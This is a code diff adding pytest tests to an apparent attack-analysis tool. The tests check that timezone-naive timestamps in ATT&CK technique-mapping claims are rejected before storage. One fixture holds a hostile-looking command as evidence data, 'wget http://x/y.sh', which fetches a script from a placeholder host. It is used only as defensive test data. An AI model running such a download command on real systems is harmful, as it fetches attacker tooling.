@@ -507,3 +507,101 @@ async def test_rejected_claim_log_contains_no_payload_content(
     assert "observed_behavior" in warning_text
     assert "seed-botnet-01" in warning_text
     await _cleanup(analysis.id)
+
+
+@pytest.mark.asyncio
+async def test_naive_claim_payload_timestamp_is_rejected() -> None:
+    """A naive datetime buried in claim.payload must be caught too.
+
+    claim.payload["timestamp"] flows straight into TechniqueMapping(**payload)
+    and lands in TechniqueMapping.timestamp, a DateTime(timezone=True)
+    column -- the same silent-reinterpretation hazard as event_timestamps,
+    just reached through a different doorway. The guard inspects payload
+    values by type (isinstance(value, datetime)), not by the key name
+    "timestamp", so this also covers a hypothetical future claim kind with a
+    differently named datetime field.
+    """
+    analysis = _analysis()
+    naive_payload_claim = Claim(
+        kind=ParentType.TECHNIQUE_MAPPING,
+        payload={
+            "technique_id": "T1105",
+            "technique_name": "Ingress Tool Transfer",
+            "tactic": "Command and Control",
+            "confidence": 1.0,
+            "ai_explanation": None,
+            "source": "rule",
+            "rule_id": "T1105",
+            "timestamp": datetime(2026, 8, 20, 10, 0, 30),  # noqa: DTZ001 -- deliberately naive
+        },
+        evidence=[EvidenceCitation(event_id="e-wget", artifact="wget http://x/y.sh")],
+    )
+
+    with pytest.raises(NaiveTimestampError, match="technique_mapping claim payload"):
+        await persist_analysis(
+            analysis, [naive_payload_claim], [], "seed-botnet-01", TIMESTAMPS
+        )
+
+    # The guard runs before any session opens -- nothing should exist.
+    factory = get_session_factory()
+    async with factory() as db:
+        stored = await db.get(Analysis, analysis.id)
+        assert stored is None
+        mappings = (
+            (await db.execute(select(TechniqueMapping).where(TechniqueMapping.analysis_id == analysis.id)))
+            .scalars()
+            .all()
+        )
+        assert mappings == []
+
+
+@pytest.mark.asyncio
+async def test_naive_analysis_created_at_is_rejected() -> None:
+    """A naive Analysis.created_at must be caught, same reasoning as the others."""
+    analysis = _analysis()
+    analysis.created_at = datetime(2026, 8, 20, 10, 0, 30)  # noqa: DTZ001 -- deliberately naive
+
+    with pytest.raises(NaiveTimestampError, match="Analysis.created_at"):
+        await persist_analysis(
+            analysis, [_grounded_claim()], [], "seed-botnet-01", TIMESTAMPS
+        )
+
+    # The guard runs before any session opens -- nothing should exist.
+    factory = get_session_factory()
+    async with factory() as db:
+        stored = await db.get(Analysis, analysis.id)
+        assert stored is None
+        mappings = (
+            (await db.execute(select(TechniqueMapping).where(TechniqueMapping.analysis_id == analysis.id)))
+            .scalars()
+            .all()
+        )
+        assert mappings == []
+
+
+@pytest.mark.asyncio
+async def test_all_three_datetime_sources_aware_persists_normally() -> None:
+    """Fully tz-aware input across event_timestamps, claim.payload, and
+    Analysis.created_at must not be over-rejected by the broadened guard.
+    """
+    analysis = _analysis()
+    rejected = await persist_analysis(
+        analysis, [_grounded_claim()], [], "seed-botnet-01", TIMESTAMPS
+    )
+    assert rejected == 0
+
+    factory = get_session_factory()
+    async with factory() as db:
+        mapping = (
+            (
+                await db.execute(
+                    select(TechniqueMapping).where(
+                        TechniqueMapping.analysis_id == analysis.id
+                    )
+                )
+            )
+            .scalars()
+            .one()
+        )
+    assert mapping.technique_id == "T1105"
+    await _cleanup(analysis.id)
